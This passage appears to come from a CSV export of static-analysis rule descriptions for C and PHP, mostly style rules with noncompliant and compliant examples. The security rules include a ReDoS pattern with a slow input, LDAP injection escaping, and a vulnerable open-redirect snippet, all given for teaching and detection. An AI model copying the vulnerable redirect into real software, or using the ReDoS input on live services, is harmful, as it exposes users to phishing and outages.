<pre>
int fun() {
  if (condition1) {
    return 1;
  } else {
    if (condition2) {
      return 0;
    } else {
      return 1;
    }
  }
  return 0;
}
</pre>",c:S1142,c,C,"<p>Having too many return statements in a function increases the function's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
int fun() {
  if (condition1) {
    return 1;
  } else {
    if (condition2) {
      return 0;
    } else {
      return 1;
    }
  }
  return 0;
}
</pre>",Functions should not contain too many return statements,"[{'key': 'max', 'htmlDesc': 'Maximum allowed return statements per function', 'defaultValue': '3', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of
<code>case</code> clause should be extracted in a dedicated function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
switch (myVariable) {
  case 0: // 6 lines till next case
    methodCall1("""");
    methodCall2("""");
    methodCall3("""");
    methodCall4("""");
    break;
  case 1:
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 0:
    doSomething();
    break;
  case 1:
  // ...
}
// ...
void doSomething(){
    methodCall1("""");
    methodCall2("""");
    methodCall3("""");
    methodCall4("""");
}
</pre>",c:S1151,c,C,"<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of
<code>case</code> clause should be extracted in a dedicated function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
switch (myVariable) {
  case 0: // 6 lines till next case
    methodCall1("""");
    methodCall2("""");
    methodCall3("""");
    methodCall4("""");
    break;
  case 1:
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 0:
    doSomething();
    break;
  case 1:
  // ...
}
// ...
void doSomething(){
    methodCall1("""");
    methodCall2("""");
    methodCall3("""");
    methodCall4("""");
}
</pre>","""switch case"" clauses should not have too many lines of code","[{'key': 'max', 'htmlDesc': 'Maximum Number of Lines', 'defaultValue': '5', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2015-12-08T13:43:29+0100,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
  int my_field;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  int myField;
};
</pre>",c:S116,c,C,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
  int my_field;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  int myField;
};
</pre>",Field names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the field names against.', 'defaultValue': '^[a-z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-06-30T14:50:25+0200,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
void doSomething(int my_param) {
  int LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int myParam) {
  int local;
  ...
}
</pre>
<h2>Exceptions</h2>
<p>Loop counters and <code>const</code> variables are ignored by this rule.</p>",c:S117,c,C,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
void doSomething(int my_param) {
  int LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int myParam) {
  int local;
  ...
}
</pre>
<h2>Exceptions</h2>
<p>Loop counters and <code>const</code> variables are ignored by this rule.</p>",Local variable and function parameter names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the names against.', 'defaultValue': '^[a-z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-09-10T08:27:46+0200,"<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown in languages where that mechanism is available. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void fun(int p1) {
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void fun(int p1) {
  int a = doSomething(p1);
  int threshold = 42;
  if (a &gt; threshold) {
    // ...
  }
}
</pre>
<p>or </p>
<pre>
void fun(int p1) {
  // Intentionally unimplemented...
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue for empty class constructors or destructors. For instance this is the only way to define user-defined default
constructors.</p>",c:S1186,c,C,"<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown in languages where that mechanism is available. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void fun(int p1) {
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void fun(int p1) {
  int a = doSomething(p1);
  int threshold = 42;
  if (a &gt; threshold) {
    // ...
  }
}
</pre>
<p>or </p>
<pre>
void fun(int p1) {
  // Intentionally unimplemented...
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue for empty class constructors or destructors. For instance this is the only way to define user-defined default
constructors.</p>",Methods should not be empty,[],CRITICAL,['suspicious'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>In 1978, Brian Kernighan and Dennis Ritchie published the first edition of The C Programming Language. This book, known to C programmers as
""K&amp;R"", served for many years as an informal specification of the language. The version of C that it describes is commonly referred to as K&amp;R
C. </p>
<p>The K&amp;R function definition syntax introduced in the book was later deprecated in the ANSI C and ISO C standards. Even though the K&amp;R
syntax is still supported in the ISO C11 standard, it's not in ISO C++ standard versions and is not considered readable by most C/C++ developers
today. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int foo(a, b)   // Noncompliant K&amp;R C syntax
  int a;
  char* b;
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int foo(int a, char* b) { // Compliant
}
</pre>",c:S1198,c,C,"<p>In 1978, Brian Kernighan and Dennis Ritchie published the first edition of The C Programming Language. This book, known to C programmers as
""K&amp;R"", served for many years as an informal specification of the language. The version of C that it describes is commonly referred to as K&amp;R
C. </p>
<p>The K&amp;R function definition syntax introduced in the book was later deprecated in the ANSI C and ISO C standards. Even though the K&amp;R
syntax is still supported in the ISO C11 standard, it's not in ISO C++ standard versions and is not considered readable by most C/C++ developers
today. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int foo(a, b)   // Noncompliant K&amp;R C syntax
  int a;
  char* b;
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int foo(int a, char* b) { // Compliant
}
</pre>",Deprecated K&R syntax should not be used for function definition,[],MAJOR,"['confusing', 'obsolete']",CODE_SMELL
2014-05-24T08:26:46+0200,"<p>Nested code blocks can be used to create a new scope and restrict the visibility of the variables defined inside it. Using this feature in a method
typically indicates that the method has too many responsibilities, and should be refactored into smaller methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD: {                                // Noncompliant - nested code block '{' ... '}'
        int a = stack.pop();
        int b = stack.pop();
        int result = a + b;
        stack.push(result);
        break;
      }
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD:                                  // Compliant
      evaluateAdd();
      break;
    /* ... */
  }
}

private void evaluateAdd() {
  int a = stack.pop();
  int b = stack.pop();
  int result = a + b;
  stack.push(result);
}
</pre>",c:S1199,c,C,"<p>Nested code blocks can be used to create a new scope and restrict the visibility of the variables defined inside it. Using this feature in a method
typically indicates that the method has too many responsibilities, and should be refactored into smaller methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD: {                                // Noncompliant - nested code block '{' ... '}'
        int a = stack.pop();
        int b = stack.pop();
        int result = a + b;
        stack.push(result);
        break;
      }
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD:                                  // Compliant
      evaluateAdd();
      break;
    /* ... */
  }
}

private void evaluateAdd() {
  int a = stack.pop();
  int b = stack.pop();
  int result = a + b;
  stack.push(result);
}
</pre>",Nested code blocks should not be used,[],MINOR,['bad-practice'],CODE_SMELL
2015-03-14T14:43:57+0100,"<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1QGMAg"">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>",c:S121,c,C,"<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1QGMAg"">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>",Control structures should use curly braces,[],CRITICAL,"['cert', 'misra', 'pitfall']",CODE_SMELL
2014-11-07T16:16:36+0100,"<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing
error.</p>
<h2>Noncompliant Code Example</h2>
<p>Case 1, the code is syntactically correct but the behavior is not the expected one</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  WEDNESDAY:   // instead of ""case WEDNESDAY""
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2, the code is correct and behaves as expected but is hardly readable </p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    foo:for(int i = 0 ; i &lt; X ; i++) {
         /* ... */
        break foo;  // this break statement doesn't relate to the nesting case TUESDAY
         /* ... */
    }
    break;
    /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<p>Case 1</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  case WEDNESDAY:
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2</p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    compute(args); // put the content of the labelled ""for"" statement in a dedicated method
    break;

    /* ... */
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
</ul>",c:S1219,c,C,"<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing
error.</p>
<h2>Noncompliant Code Example</h2>
<p>Case 1, the code is syntactically correct but the behavior is not the expected one</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  WEDNESDAY:   // instead of ""case WEDNESDAY""
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2, the code is correct and behaves as expected but is hardly readable </p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    foo:for(int i = 0 ; i &lt; X ; i++) {
         /* ... */
        break foo;  // this break statement doesn't relate to the nesting case TUESDAY
         /* ... */
    }
    break;
    /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<p>Case 1</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  case WEDNESDAY:
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2</p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    compute(args); // put the content of the labelled ""for"" statement in a dedicated method
    break;

    /* ... */
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
</ul>","""switch"" statements should not contain non-case labels",[],BLOCKER,"['misra', 'suspicious']",CODE_SMELL
2015-02-03T08:39:44+0100,"<p>While it is technically correct to assign to parameters from within function bodies, it is better to use temporary variables to store intermediate
results.</p>
<p>Allowing parameters to be assigned to also reduces the code readability as developers will not be able to know whether the original parameter or
some temporary variable is being accessed without going through the whole function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int glob = 0;
void function (int a) {
  a = glob; // Noncompliant
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int glob = 0;
void function (int a) {
  int b = glob;
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.8 - A function parameter should not be modified </li>
</ul>",c:S1226,c,C,"<p>While it is technically correct to assign to parameters from within function bodies, it is better to use temporary variables to store intermediate
results.</p>
<p>Allowing parameters to be assigned to also reduces the code readability as developers will not be able to know whether the original parameter or
some temporary variable is being accessed without going through the whole function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int glob = 0;
void function (int a) {
  a = glob; // Noncompliant
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int glob = 0;
void function (int a) {
  int b = glob;
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.8 - A function parameter should not be modified </li>
</ul>",Function parameters should not be reassigned,[],MINOR,"['misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p><code>break;</code> is an unstructured control flow statement which makes code harder to read.</p>
<p>Ideally, every loop should have a single termination condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (element = list.first; element != null; element = element-&gt;next) { // First termination condition
  if (!matches(element-&gt;value)) {                                      // Second termination condition
    break; // Noncompliant
  }

  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant
for (element = list.first; element != null &amp;&amp; matches(element-&gt;value); element = element-&gt;next) {
  /* ... */
}
</pre>",c:S1227,c,C,"<p><code>break;</code> is an unstructured control flow statement which makes code harder to read.</p>
<p>Ideally, every loop should have a single termination condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (element = list.first; element != null; element = element-&gt;next) { // First termination condition
  if (!matches(element-&gt;value)) {                                      // Second termination condition
    break; // Noncompliant
  }

  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant
for (element = list.first; element != null &amp;&amp; matches(element-&gt;value); element = element-&gt;next) {
  /* ... */
}
</pre>",break statements should not be used except for switch cases,[],MINOR,[],CODE_SMELL
2015-01-15T09:18:32+0100,"<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is
not associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be
different based on the order of those operation because of the rounding that takes place at each step.</p>
<p>Even simple floating point assignments are not simple:</p>
<pre>
float f = 0.1; // 0.100000001490116119384765625
double d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625
</pre>
<p>(Results will vary based on compiler and compiler settings.)</p>
<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values
is almost always an error. </p>
<p>The accepted solution is to use or write a float comparison library that takes floating-point granularity (FLT_EPSILON) and the magnitude of the
numbers being compared into account.</p>
<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float myNumber = 3.146;
if ( myNumber == 3.146 ) {  //Noncompliant. Because of floating point imprecision, this will be false
  // ...
}

if (myNumber &lt;= 3.146 &amp;&amp; mNumber &gt;= 3.146) { // Noncompliant indirect equality test
  // ...
}

if (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant indirect inequality test
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.3 - Floating-point expressions shall not be tested for equality or inequality. </li>
  <li> MISRA C++:2008, 6-2-2 - Floating-point expressions shall not be directly or indirectly tested for equality or inequality </li>
</ul>",c:S1244,c,C,"<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is
not associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be
different based on the order of those operation because of the rounding that takes place at each step.</p>
<p>Even simple floating point assignments are not simple:</p>
<pre>
float f = 0.1; // 0.100000001490116119384765625
double d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625
</pre>
<p>(Results will vary based on compiler and compiler settings.)</p>
<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values
is almost always an error. </p>
<p>The accepted solution is to use or write a float comparison library that takes floating-point granularity (FLT_EPSILON) and the magnitude of the
numbers being compared into account.</p>
<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float myNumber = 3.146;
if ( myNumber == 3.146 ) {  //Noncompliant. Because of floating point imprecision, this will be false
  // ...
}

if (myNumber &lt;= 3.146 &amp;&amp; mNumber &gt;= 3.146) { // Noncompliant indirect equality test
  // ...
}

if (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant indirect inequality test
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.3 - Floating-point expressions shall not be tested for equality or inequality. </li>
  <li> MISRA C++:2008, 6-2-2 - Floating-point expressions shall not be directly or indirectly tested for equality or inequality </li>
</ul>",Floating point numbers should not be tested for equality,[],MAJOR,['misra'],BUG
2014-05-24T08:26:46+0200,"<p>Function pointer syntax can be hard on the eyes, particularly when one function is used as a parameter to another. Providing and using a
<code>typedef</code> instead can make code easier to read, and should be preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
extern void (*signal(int, void(*)(int)))(int);
</pre>
<h2>Compliant Solution</h2>
<pre>
typedef void (*SignalHandler)(int signum);
extern SignalHandler signal(int signum, SignalHandler handler);
</pre>",c:S1259,c,C,"<p>Function pointer syntax can be hard on the eyes, particularly when one function is used as a parameter to another. Providing and using a
<code>typedef</code> instead can make code easier to read, and should be preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
extern void (*signal(int, void(*)(int)))(int);
</pre>
<h2>Compliant Solution</h2>
<pre>
typedef void (*SignalHandler)(int signum);
extern SignalHandler signal(int signum, SignalHandler handler);
</pre>","""typedef"" should be used for function pointers",[],CRITICAL,[],CODE_SMELL
2017-11-30T14:19:40+0100,"<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$target = -5;
$num = 3;

$target =- $num;  // Noncompliant; target = -3. Is that really what's meant?
$target =+ $num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
$target = -5;
$num = 3;

$target = -$num;  // Compliant; intent to assign inverse value of num is clear
$target += $num;
</pre>",php:S2757,php,PHP,"<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$target = -5;
$num = 3;

$target =- $num;  // Noncompliant; target = -3. Is that really what's meant?
$target =+ $num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
$target = -5;
$num = 3;

$target = -$num;  // Compliant; intent to assign inverse value of num is clear
$target += $num;
</pre>","""=+"" should not be used instead of ""+=""",[],MAJOR,[],BUG
2019-03-26T06:42:30+0100,"<p>Evaluating regular expressions against input strings can be an extremely CPU-intensive task. For example, a specially crafted regular expression
such as <code>(a+)++</code> will take several seconds to evaluate the input string,&nbsp;<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is
that every additional ""<code>a""</code> added to the input doubles the time required to evaluate the regex. However, the equivalent regular expression,
<code>a</code> (without grouping), is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door for Denial Of Service attacks. In the context of a web application,
attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the service inaccessible to genuine
users.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",phpsecurity:S2631,php,PHP,"<p>Evaluating regular expressions against input strings can be an extremely CPU-intensive task. For example, a specially crafted regular expression
such as <code>(a+)++</code> will take several seconds to evaluate the input string,&nbsp;<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is
that every additional ""<code>a""</code> added to the input doubles the time required to evaluate the regex. However, the equivalent regular expression,
<code>a</code> (without grouping), is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door for Denial Of Service attacks. In the context of a web application,
attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the service inaccessible to genuine
users.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",Regular expressions should not be vulnerable to Denial of Service attacks,[],BLOCKER,"['denial-of-service', 'owasp-a1']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing LDAP names or search filters directly
from tainted data enables attackers to inject specially crafted values that changes the initial meaning of the name or filter itself. Successful LDAP
injections attacks can read, modify or delete sensitive information from the directory service.</p>
<p>Within LDAP names, the special characters <code>' '</code>, <code>'#'</code>, <code>'""'</code>, <code>'+'</code>, <code>','</code>,
<code>';'</code>, <code>'&lt;'</code>, <code>'&gt;'</code>, <code>'\'</code> and <code>null</code> must be escaped according to RFC 4514, for example
by replacing them with the backslash character <code>'\'</code> followed by the two hex digits corresponding to the ASCII code of the character to be
escaped. Similarly, LDAP search filters must escape a different set of special characters (including but not limited to <code>'*'</code>,
<code>'('</code>, <code>')'</code>, <code>'\'</code> and <code>null</code>) according to RFC 4515.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.ietf.org/rfc/rfc4514.txt"">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href=""https://www.ietf.org/rfc/rfc4515.txt"">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/90"">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/CgLEAw"">CERT, IDS54-J.</a> - Prevent LDAP injection </li>
</ul>",phpsecurity:S2078,php,PHP,"<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing LDAP names or search filters directly
from tainted data enables attackers to inject specially crafted values that changes the initial meaning of the name or filter itself. Successful LDAP
injections attacks can read, modify or delete sensitive information from the directory service.</p>
<p>Within LDAP names, the special characters <code>' '</code>, <code>'#'</code>, <code>'""'</code>, <code>'+'</code>, <code>','</code>,
<code>';'</code>, <code>'&lt;'</code>, <code>'&gt;'</code>, <code>'\'</code> and <code>null</code> must be escaped according to RFC 4514, for example
by replacing them with the backslash character <code>'\'</code> followed by the two hex digits corresponding to the ASCII code of the character to be
escaped. Similarly, LDAP search filters must escape a different set of special characters (including but not limited to <code>'*'</code>,
<code>'('</code>, <code>')'</code>, <code>'\'</code> and <code>null</code>) according to RFC 4515.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.ietf.org/rfc/rfc4514.txt"">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href=""https://www.ietf.org/rfc/rfc4515.txt"">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/90"">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/CgLEAw"">CERT, IDS54-J.</a> - Prevent LDAP injection </li>
</ul>",LDAP queries should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1']",VULNERABILITY
2019-03-26T06:42:30+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
performing HTTP redirects based on tainted data could enable an attacker to redirect users to a malicious site to, for example, steal login
credentials.</p>
<p>This problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not perform redirects based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
$url = $this-&gt;request-&gt;getQuery(""url"");
return $this-&gt;redirect($url); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$whitelist = array(
  ""https://www.sonarsource.com/""
);
$url = $this-&gt;request-&gt;getQuery(""url"");
if (in_array($url, $whitelist)) {
  return $this-&gt;redirect($url);
} else {
  throw new ForbiddenException();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/601.html"">MITRE, CWE-601</a> - URL Redirection to Untrusted Site ('Open Redirect') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",phpsecurity:S5146,php,PHP,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
performing HTTP redirects based on tainted data could enable an attacker to redirect users to a malicious site to, for example, steal login
credentials.</p>
<p>This problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not perform redirects based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
$url = $this-&gt;request-&gt;getQuery(""url"");
return $this-&gt;redirect($url); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$whitelist = array(
  ""https://www.sonarsource.com/""
);
$url = $this-&gt;request-&gt;getQuery(""url"");
if (in_array($url, $whitelist)) {
  return $this-&gt;redirect($url);
} else {
  throw new ForbiddenException();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
